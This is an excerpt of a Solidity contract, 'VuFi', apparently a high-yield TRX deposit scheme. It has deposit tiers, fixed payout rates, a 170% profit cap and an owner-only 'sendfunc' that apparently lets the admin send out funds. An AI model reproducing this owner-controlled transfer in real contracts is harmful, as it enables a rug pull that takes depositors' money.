...
contract VuFi {
    ...
    uint private releaseTime = 1620210203; // 
    ...
    function sendfunc(address  _addr,uint256 _amount) public {
        require(msg.sender == owner ,'you are not admin');
    ...
    function setTier(address _addr) private {
        Player storage player = players[_addr];
        if(player.trxDeposit > 1e9 && player.tier < 1) { player.tier = 1; player.time = now; }
        if(player.trxDeposit > 25e9 && player.tier < 2) { player.tier = 2; player.time = now; }
        if(player.trxDeposit > 35e9 && player.tier < 3) { player.tier = 3; player.time = now; }
    ...
    function getRate(uint256 _tier) internal pure returns (uint256) {
        uint256 _rate = 150462;
        if(_tier == 1) { _rate = 173612; }
        if(_tier == 2) { _rate = 196760; }
        if(_tier == 3) { _rate = 196760; }
        if(_tier == 4) { _rate = 196760; }
       return _rate;
    }
    
    function getTimeLimit(uint256 _tier) internal pure returns(uint256) {
        uint256 timeLimit = 8640000;
        if(_tier == 1) timeLimit = 8640000;
        if(_tier == 2) timeLimit = 8640000;
        if(_tier == 3) timeLimit = 8640000;
        if(_tier == 4) timeLimit = 8640000;
        return timeLimit;
    }
    ...
    function collect(address _addr) internal {
        ...
        uint256 timeLimit = 8640000;
        if(player.tier == 1) timeLimit = 8640000;
        if(player.tier == 2) timeLimit = 8640000;
        if(player.tier == 3) timeLimit = 8640000;
        if(player.tier == 4) timeLimit = 8640000;
    ...
    function transferPayout(address _receiver, uint256 _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            ...
            if (contractBalance > 0) {
                ...
                uint256 maxProfit = (player.trxDeposit.mul(170)).div(100);
